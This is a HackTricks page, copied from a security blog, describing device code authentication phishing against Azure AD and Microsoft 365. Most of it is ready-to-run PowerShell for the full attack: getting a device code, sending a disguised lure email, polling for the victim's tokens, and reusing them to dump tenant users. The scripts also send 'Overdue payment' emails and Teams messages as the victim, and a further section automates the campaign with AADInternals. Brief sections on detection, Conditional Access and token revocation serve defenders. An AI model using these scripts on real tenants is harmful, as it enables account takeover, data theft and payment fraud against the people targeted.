# Az - Device Code Authentication Phishing

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**This post was copied from** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/)\*\*\*\*

### What is device code authentication <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

According to Microsoft [documentation](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) the device code authentication:

> allows users to sign in to input-constrained devices such as a smart TV, IoT device, or printer. To enable this flow, the device has the user visit a webpage in their browser on another device to sign in. Once the user signs in, the device is able to get access tokens and refresh tokens as needed.

The process is as follows:

1. A user starts an app supporting device code flow on a device
2. The app connects to Azure AD /devicecode endpoint and sends **client\_id** and **resource**
3. Azure AD sends back **device\_code**, **user\_code**, and **verification\_url**
4. Device shows the **verification\_url** (hxxps://microsoft.com/devicelogin) and the **user\_code** to the user
5. User opens a browsers and browses to **verification\_url**, gives the **user\_code** when asked and logs in
6. Device polls the Azure AD until after succesfull login it gets **access\_token** and **refresh\_token**

![Device Code flow](https://o365blog.com/images/posts/phishing\_5.png)

### Phishing with device code authentication <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

The basic idea to utilise device code authentication for phishing is following.

1. An attacker connects to /devicecode endpoint and sends **client\_id** and **resource**
2. After receiving **verification\_uri** and **user\_code**, create an email containing a link to **verification\_uri** and **user\_code**, and send it to the victim.
3. Victim clicks the link, provides the code and completes the sign in.
4. The attacker receives **access\_token** and **refresh\_token** and can now mimic the victim.

#### 1. Connecting to /devicecode endpoint <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

The first step is to make a http POST to Azure AD devicecode endpoint:

```
 https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```

I‚Äôm using the following parameters. I chose to use ‚ÄúMicrosoft Office‚Äù client\_id because it looks the most legit app name, and it can be used to access other resources too. The chosen resource gives access to AAD Graph API which is used by MSOnline PowerShell module.

| Parameter  | Value                                                   |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
| resource   | [https://graph.windows.net](https://graph.windows.net/) |

The response is similar to following:

```json
{
	"user_code": "CLZ8HAV2L",
	"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
	"verification_url": "https://microsoft.com/devicelogin",
	"expires_in": "900",
	"interval": "5",
	"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
```

| Parameter         | Description                                                                 |
| ----------------- | --------------------------------------------------------------------------- |
| user\_code        | The code a user will enter when requested                                   |
| device\_code      | The device code used to ‚Äúpoll‚Äù for authentication result                    |
| verification\_url | The url the user needs to browse for authentication                         |
| expires\_in       | The expiration time in seconds (15 minutes)                                 |
| interval          | The interval in seconds how often the client should poll for authentication |
| message           | The pre-formatted message to be show to the user                            |

Here is a script to connect to devicelogin endpoint:

```powershell
# Create a body, we'll be using client id of "Microsoft Office"

$body=@{
	"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
```

**Note!** I‚Äôm using a version 1.0 which is a little bit different than v2.0 flow used in the [documentation](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code).

#### 2. Creating a phishing email <a href="#2-creating-a-phishing-email" id="2-creating-a-phishing-email"></a>

Now that we have the **verification\_url** (always the same) and **user\_code** we can create and send a phishing email.

**Note!** For sending email you need a working smtp service.

Here is a script to send a phishing email to the victim:

```powershell
# Create a message

$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email

Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml 
```

The received email looks like this: ![Device Code flow](https://o365blog.com/images/posts/phishing\_6.png)

#### 3. ‚ÄúCatching the fish‚Äù - victim performs the authentication <a href="#3-catching-the-fish-victim-performs-the-authentication" id="3-catching-the-fish-victim-performs-the-authentication"></a>

When a victim clicks the link, the following site appears. As we can see, the url is a legit Microsoft url. The user is asked to enter the code from the email.

![Device code](https://o365blog.com/images/posts/phishing\_7.png)

After entering the code, user is asked to select the user to sign in. As we can see, the user is asked to sign in to **Microsoft Office** - no consents are asked.

**Note!** If the user is not logged in, the user needs to log in using whatever methods the target organisation is using.

![Login](https://o365blog.com/images/posts/phishing\_8.png)

After successfull authentication, the following is shown to the user.\\

![Profit](https://o365blog.com/images/posts/phishing\_9.png)

:warning: **At this point the identity of the user is compromised!** :warning:

#### 4. Retrieving the access tokens <a href="#4-retrieving-the-access-tokens" id="4-retrieving-the-access-tokens"></a>

The last step for the attacker is to retrieve the access tokens. After completing the step 2. the attacker starts polling the Azure AD for the authentication status.

Attacker needs to make an http POST to Azure AD token endpoint every 5 seconds:

```
 https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```

The request must include the following parameters (code is the device\_code from the step 1)

| Parameter   | Value                                                                                                                                                                                                            |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| client\_id  | d3590ed6-52b3-4102-aeff-aad2292ab01c                                                                                                                                                                             |
| resource    | [https://graph.windows.net](https://graph.windows.net/)                                                                                                                                                          |
| code        | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t\_ZM2B0cgcjQgAA |
| grant\_type | urn:ietf:params:oauth:grant-type:device\_code                                                                                                                                                                    |

If the authentication is pending, an http error **400 Bad Request** is returned with the following content:

```json
{
	"error": "authorization_pending",
	"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
	"error_codes": [70016],
	"timestamp": "2020-10-13 18:06:07Z",
	"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
	"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
	"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
```

After successfull login, we‚Äôll get the following response (tokens truncated):

```json
{
	"token_type": "Bearer",
	"scope": "user_impersonation",
	"expires_in": "7199",
	"ext_expires_in": "7199",
	"expires_on": "1602662787",
	"not_before": "1602655287",
	"resource": "https://graph.windows.net",
	"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
	"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
	"foci": "1",
	"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
```

The following script connects to the Azure AD token endpoint and polls for authentication status.

```powershell
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
	"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
	"code" =       $authResponse.device_code
	"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
	Start-Sleep -Seconds $interval
	$total += $interval

	if($total -gt $expires)
	{
		Write-Error "Timeout occurred"
		return
	}
				
	# Try to get the response. Will give 40x while pending so we need to try&catch

	try
	{
		$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
	}
	catch
	{
		# This is normal flow, always returns 40x unless successful

		$details=$_.ErrorDetails.Message | ConvertFrom-Json
		$continue = $details.error -eq "authorization_pending"
		Write-Host $details.error

		if(!$continue)
		{
			# Not pending so this is a real error

			Write-Error $details.error_description
			return
		}
	}

	# If we got response, all okay!

	if($response)
	{
		break # Exit the loop

	}
}
```

Now we can use the access token to impersonate the victim:

```powershell
# Dump the tenant users to csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```

We can also get access tokens to other services using the refresh token as long as the client\_id remains the same.

The following script gets an access token for Exchange Online.

```powershell
# Create body for getting access token for Exchange Online

$body=@{
	"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"grant_type" =    "refresh_token"
	"scope" =         "openid"
	"resource" =      "https://outlook.office365.com"
	"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```

## Using AADInternals for phishing <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternals (v0.4.4 or later) has an [Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing) function which automates the phishing process.

The phishing message can be customised, the default message is following:

```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```

Default message in email:\
![Phishing email](https://o365blog.com/images/posts/phishing\_11.png)

Default message in Teams:\
![Phishing message](https://o365blog.com/images/posts/phishing\_12.png)

### Email <a href="#email" id="email"></a>

The following example sends a phishing email using a customised message. The tokens are saved to the cache.

```powershell
# Create a custom message

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache 
```

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```

And now we can send email as the victim using the cached token.

```powershell
# Send email as the victim

Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```

We can also send a Teams message to make the payment request more urgent:

```powershell
# Send Teams message as the victim

Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
```

```
Sent                MessageID         
----                ---------         
16/10/2020 14.40.23 132473328207053858
```

**The following video shows how to use AADInternals for email phishing.**

### Teams <a href="#teams" id="teams"></a>

AADInternals supports sending phishing messages as Teams chat messages.

**Note!** After the victim has ‚Äúauthenticated‚Äù and the tokens are received, AADInternals will replace the original message. This message can be provided with -CleanMessage parameter.

The default clean message is:

```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```

![Teams clean message](https://o365blog.com/images/posts/phishing\_13.png)

The following example sends a phishing email using customised messages. The tokens are saved to the cache.

```powershell
# Get access token for Azure Core Management

Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages

Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
```

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```

**The following video shows how to use AADInternals for Teams phishing.**

## Detecting <a href="#detecting" id="detecting"></a>

First of all, from the Azure AD point-of-view the login takes place where the authentication was **initiated**. This is a very important point to understand. This means that in the signing log, the login was performed from the **attacker location and device**, not from user‚Äôs.

However, the access tokens acquired using the refresh token **do not appear in signing log!**

Below is an example where I initiated the phishing from an Azure VM (well, from the [cloud shell](https://o365blog.com/post/cloudshell/) to be more specific). As we can see, the login using the ‚ÄúMicrosoft Office‚Äù client took place at 7:23 AM from the ip-address 51.144.240.233. However, getting the access token for Exchange Online at 7:27 AM is not shown in the log.

![Azure AD signing log](https://o365blog.com/images/posts/phishing\_10.png)

:warning: If there are indications that the user is signing in from non-typical locations, the user account might be compromised.

## Preventing <a href="#preventing" id="preventing"></a>

The only effective way for preventing phishing using this technique is to use [Conditional Access](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview) (CA) policies. To be specific, the **phishing can not be prevented**, but we can **prevent users from signing in** based on certain rules. Especially the location and device state based policies are effective for protecting accounts. This applies for the all phishing techniques currently used.

However, it is not possible to cover all scenarios. For instance, forcing MFA for logins from illicit locations does not help if the user is logging in using MFA.

## Mitigating <a href="#mitigating" id="mitigating"></a>

If the user has been compromised, the user‚Äôs refresh tokens can be [revoked](https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0), which prevents attacker getting new access tokens with the compromised refresh token.

## Summary <a href="#summary" id="summary"></a>

As far as I know, the device code authentication flow technique has not used for phishing before.

From the attacker point of view, this method has a couple of pros:

* No need to register any apps
* No need to setup a phishing infrastructure for fake login pages etc.
* The user is only asked to sign in (usually to ‚ÄúMicrosoft Office‚Äù) - no consents asked
* Everything happens in **login.microsoftonline.com** namespace
* Attacker can use any client\_id and resource (not all combinations work though)
* If the user signed in using MFA, the access token also has MFA claim (this includes also the access tokens fetched using the refresh token)
* Preventing requires Conditional Access (and Azure AD Premium P1/P2 licenses)

From the attacker point of view, this method has at least one con:

* The user code is valid only for 15 minutes

Of course, the attacker can minimise the time restriction by sending the phishing email to multiple recipients - this will increase the probability that someone signs in using the code.

Another way is to implement [a proxy](https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333) which would start the authentication when the link is clicked (credits to [@MrUn1k0d3r](https://twitter.com/MrUn1k0d3r)). However, this way the advantage of using a legit microsoft.com url would be lost.

Checklist for surviving phishing campaings:

1. **Educate your users** about information security and phishing :woman\_teacher:
2. Use Multi-Factor Authentication (MFA) :iphone:
3. Use Intune :hammer\_and\_wrench: and Conditional Access (CA) :stop\_sign:

\\

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
